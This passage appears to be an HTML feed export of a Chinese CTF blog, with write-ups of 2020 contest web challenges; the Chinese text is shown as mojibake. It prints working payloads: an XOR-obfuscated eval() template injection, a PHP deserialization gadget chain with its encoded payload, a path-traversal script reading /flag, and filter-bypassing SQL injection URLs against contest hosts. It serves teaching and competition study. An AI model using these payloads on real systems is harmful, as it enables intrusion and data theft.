class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹åˆ°<code>parserIfLabel</code>å‡½æ•°é‡Œçš„æ­£åˆ™</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>[\s\S]</code>è¡¨ç¤ºé€šé…ï¼Œçœ‹åˆ°åé¢æœ‰ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œå°è¯•æ˜¯å¦å¯ä»¥å†™è¿›å‡½æ•°ã€‚</p>
<p>è¿™é‡Œéšä¾¿è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™å¼å¯ä»¥åŒ¹é…çš„ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />

<p>è¿™é‡Œåœ¨æœ¬åœ°æµ‹è¯•æŠŠ<code>danger_key</code>è¿‡æ»¤å‡½æ•°å»æ‰ä¹‹åå‘ç°ï¼Œå†ä¼ <code>phpinfo</code></p>
<p>ç›´æ¥å‡ºç°<code>phpinfo()</code>çš„é¡µé¢</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />

<p>ç„¶åå°±æ˜¯ç»•è¿‡<code>danger_key</code>ï¼Œè¿™é‡Œè¿‡æ»¤phpä»¥åŠä¸€äº›å‡½æ•°ç­‰ç­‰ï¼Œå°è¯•ç”¨å¼‚æˆ–æ„é€ å­—ç¬¦ã€‚</p>
<p>å¼‚æˆ–æ„é€ <code>phpinfo()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;4:49:R9&#x27;</span>^<span class="string">&#x27;DRDPT4V&#x27;</span>)()//phpinfo()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2zebqdx3ky4mu3qy28yg.cloudeci1.ichunqiu.com/?a=&#123;if:%20(%274:49:R9%27^%27DRDPT4V%27)()&#125;()&#123;end%20%20%20if&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨phpinfoé‡Œé¢å‘ç°flagã€‚</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°éœ€è¦<code>$trick1</code>å’Œ<code>$trick2</code>ä¸ç›¸ç­‰ï¼Œä½†æ˜¯md5å€¼ç›¸ç­‰çš„å¼ºç»•è¿‡ï¼Œè¿˜é™åˆ¶äº†é•¿åº¦ä¸èƒ½è¶…è¿‡5ï¼Œè€Œä¸”<code>$trick1</code>è¢«è½¬ä¸ºäº†<code>string</code>ï¼Œæ•°ç»„ç»•è¿‡å‘ç°ä¸å¯è¡Œã€‚</p>
<p>è¿™é‡Œå°±æ˜¯ä¸¤ä¸ªä¸åŒç±»å‹çš„å˜é‡ï¼Œä¸€ä¸ª<code>float</code>ï¼Œä¸€ä¸ª<code>string</code>ï¼Œåœ¨åšæ¯”è¾ƒæ—¶ä¸ç›¸ç­‰ï¼Œåœ¨md5å¤„ç†æ—¶ç›¸ç­‰ã€‚è¿™é‡Œå¯ä»¥ç”¨phpçš„INFï¼ˆæ— ç©·å¤§ï¼‰ã€‚</p>
<p>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps7gku8ou0x.cloudeci1.ichunqiu.com&#x2F;?trick&#x3D;O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾çœ‹åˆ°flagã€‚</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h2><p>WMCTFçš„é“¾ï¼Œæ”¹æ”¹å°±èƒ½ç”¨äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span>  $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;<span class="title">kawi</span>&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params">$offset, $value</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0y4x958n38d0jl6pv.cloudeci1.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>flagåœ¨phpinfoé‡Œé¢ã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>å®‰æ’ä¸ƒæœˆèµ› 2020</title>
    <url>/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<p>å°±å‡ é“é¢˜ï¼Œæ°´ä¸€ä¸‹<a id="more"></a></p>
<h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>æ‰“å¼€é¢˜ç›®é“¾æ¥åæ˜¾ç¤ºå‡ºæ¥çš„æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ä¼šåœ¨imgæ ‡ç­¾ç§å‘ç°ä¸€ä¸ª/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
<p>è¿™é“é¢˜ç›®è€ƒç‚¹ä¹Ÿæ˜¯æ–‡ä»¶è¯»å–ï¼Œæ‰€ä»¥åˆ©ç”¨ç‚¹è‚¯å®šåœ¨fè¿™ä¸ªå‚æ•°äº†ï¼Œä½†åªæ˜¯è¿‡æ»¤äº†å¼€å¤´çš„<code>../</code></p>
<p>è¿™é‡Œç”¨ä¸€ä¸‹Hhhmå¸ˆå‚…çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;hhhm/../../../../../../../../flag&quot;</span></span><br><span class="line">file = base64.b64encode(file.encode())</span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10009/image.php?t=&#123;0&#125;&amp;f=&#123;1&#125;&quot;</span></span><br><span class="line">now = int(time.time())</span><br><span class="line">rep = requests.get(url.format(str(now),file.decode()))</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqil"><a href="#Sqil" class="headerlink" title="Sqil"></a><strong>Sqil</strong></h3><p>é¦–å…ˆfuzzä¹‹åå‘ç°æ­£åˆ™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;</span>, $id);</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿‡æ»¤inå’Œorè¢«è¿‡æ»¤äº†ï¼Œæ„å‘³ç€information_schemaä¸èƒ½ä½¿ç”¨</p>
<p>ä¸€èˆ¬æ¥è¯´ç»•è¿‡informationæœ‰ä¸¤ç§</p>
<ul>
<li>sys.x$schema_flattened_keys</li>
<li>sys.schema_table_statistics_with_buffer</li>
</ul>
<p>ä½†æ˜¯ç¬¬äºŒç§é‡Œçš„statè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæ³¨å‡ºè¡¨åpayload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 [id] =&gt; 1 [1] =&gt; 2 [username] =&gt; 2 [2] =&gt; flllaaaggg,users [password] =&gt; flllaaaggg,users )</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰flllaaaggg,usersä¸¤ç§è¡¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥ï¼Œæ— åˆ—åæ³¨å…¥å¯å‚è€ƒï¼š<a class="foo" href="https://www.jianshu.com/p/6eba3370cfab" target="_blank">ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥</a></p>
<p>æŸ¥çœ‹usersè¡¨å†…å®¹</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select*from/**/users)x)%23</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹fllllaaagggè¡¨å†…å®¹</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/a,2/**/as/**/b/**/union/**/select*from/**/flllaaaggg)x)%23</span><br></pre></td></tr></table></figure>

<h3 id="MISC-welcome"><a href="#MISC-welcome" class="headerlink" title="MISC-welcome"></a><strong>MISC-welcome</strong></h3><p>å‰é¢æ²¡è®°é”™çš„è¯ï¼Œåº”è¯¥æ˜¯è™ç¬¦çš„åŸé¢˜å§ï¼Œé¢˜ç›®é™„ä»¶æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>flag.rar</code>  ä¸€ä¸ª<code>red_blue.png</code>ã€‚</p>
<p>ç”¨<code>stegsolve</code>æŸ¥çœ‹å›¾ç‰‡ï¼Œ<code>Save Bin</code>å¯ç›´æ¥å¾—åˆ°å›¾ç‰‡æå–å‡ºæ¥å‘ç°æ˜¯å¯†ç ä¸º<code>/*///1258/*/@#</code></p>
<p>360è§£å‹æ‰“å¼€å‘ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Ao(mgHXo,o0fV<span class="string">&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span></span><br></pre></td></tr></table></figure>

<p>å½“æ—¶æ²¡æƒ³åˆ°æ˜¯base85ç¼–ç ï¼Œæ‰€ä»¥æ²¡åšå‡ºæ¥</p>
<p>åœ¨çº¿è§£å¯†å¾—åˆ°flagï¼š<a href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>è™ç¬¦&amp;MRCTF 2020</title>
    <url>/2020/04/24/%E8%99%8E%E7%AC%A6%E5%92%8CMRCTF/</url>
    <content><![CDATA[<p>è¿™æ¬¡å¤ç°çš„é¢˜ç›®æ˜¯å¸ˆå…„æœ¬å‘¨å¼€ä¼šè®²çš„é¢˜ç›®ï¼Œæˆ‘éƒ½å¤ç°äº†ä¸€ä¸‹ï¼Œåˆå­¦åˆ°äº†æ–°çš„ä¸œè¥¿ã€‚é¢˜ç›®å…·ä½“è¯¦æƒ…å¯ä»¥å‚è€ƒå¸ˆå…„çš„æ–‡ç« ï¼š<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">ä¼ é€é—¨</a><a id="more"></a></p>
<h2 id="è™ç¬¦"><a href="#è™ç¬¦" class="headerlink" title="è™ç¬¦"></a><strong>è™ç¬¦</strong></h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h3><p>é¦–å…ˆæ‰“å¼€é¢˜ç›®æºç å‘ç°static/js/app.jsï¼Œè¿›å»åå‘ç°koa</p>
<p>åˆ©ç”¨ koa-static é”™è¯¯é…ç½®çš„æºç æ³„éœ²è·å¾—æºç ï¼Œè¿›è¡Œå®¡è®¡ã€‚ç›´æ¥è¯»å–app.js</p>
<p>koaæ˜¯åŸºäºNode.jsçš„webæ¡†æ¶ã€‚ç„¶åå†è¿›å»controller.js</p>
<p>å†è¿›å…¥controllers/api.jsã€‚apiæ˜¯é€šè¿‡æŠ“åŒ…å‘ç°çš„</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        